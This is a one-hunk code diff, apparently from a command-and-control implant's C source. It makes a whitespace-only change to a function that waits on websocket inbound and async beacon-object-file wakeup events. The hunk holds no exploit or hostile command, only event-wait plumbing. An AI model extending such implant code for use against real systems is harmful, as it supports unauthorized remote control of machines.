@@ -705,7 +705,7 @@ DWORD WebsocketWaitInbound(DWORD dwMilliseconds)
     
 #if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
     /* Wait on two possible events: (1) websocket inbound event, (2) async bof wakeup event */
-    const HANDLE Events[] = {xenonConfig->WsInboundEvent, g_AsyncBofWakeup};    
+    const  HANDLE Events[] = { xenonConfig->WsInboundEvent, g_AsyncBofWakeup };    
     return WaitForMultipleObjects(2, Events, FALSE, dwMilliseconds);
 #else
     return WaitForSingleObject(xenonConfig->WsInboundEvent, dwMilliseconds);
